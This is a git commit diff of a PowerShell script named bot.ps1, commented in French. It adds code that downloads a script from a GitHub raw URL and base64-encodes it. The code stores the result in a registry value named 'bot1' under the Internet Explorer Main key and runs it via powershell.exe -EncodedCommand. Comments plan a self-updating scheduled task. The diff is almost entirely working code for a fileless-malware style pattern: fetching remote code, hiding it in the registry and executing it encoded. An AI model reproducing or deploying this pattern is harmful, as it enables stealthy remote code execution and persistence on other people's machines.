7f4e06014f703e6a0ef320fcb674be5c1fe9f274
theurtebize <t.heurtebize@outlook.com>
2020-02-14 11:33:38 +0100

    Update bot.ps1

--- bot.ps1
+++ bot.ps1
@@ -2,10 +2,37 @@ Import-Module "c:\lib\script1.ps1"
 
 $version = 1
 
-$gitLink = 'https://raw.githubusercontent.com/theurtebize/majBOT/master/bot.ps1'
+<#
+
+### Liste de choses à faire ### 
+    <#
+    Récupérer la version du git
+    Comparer avec celui actuelle
+    Mettre à jour si besoin
+    #>
+
+    <#
+
+    #>
+
+    <#
+    Mettre une tâche plannifier
+        -> Synchro du script tout les X temps
+        -> tâche pour montrer que cela fonctionne
+    #>
+
+#>
+
+#Chemin du script
+$gitLink   = 'https://raw.githubusercontent.com/theurtebize/majBOT/master/bot.ps1'
+
+#Paramètres de la clé registre crée
+$cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
+$nomCle    = 'bot1'
+$typeCle   = "String"
 
 # Récupération du git
-$recupGit = Invoke-WebRequest -Uri $gitLink -UseBasicParsing #-OutFile 'C:\lib\test.ps1'
+$recupGit = Invoke-WebRequest -Uri $gitLink -UseBasicParsing 
 
 # Conversion en Base64
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($recupGit)
@@ -13,7 +40,14 @@ $convert64 =[Convert]::ToBase64String($Bytes)
 $convert64
 
 #Création de la clé registre
+New-ItemProperty -Path $cheminCle -Name $nomCle -Value $convert64  -PropertyType $typeCle
 
+#récupératin de la clé registre
+$key = get-itemproperty -path $cheminCle
+#$key.ProductName
 
+#Décoder la clé base 64
+#$Decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($convert64))
+#$Decode
 
-$closeACK = FRX_Socket-Listen-Close -socket $Socket
+powershell.exe -EncodedCommand $convert64
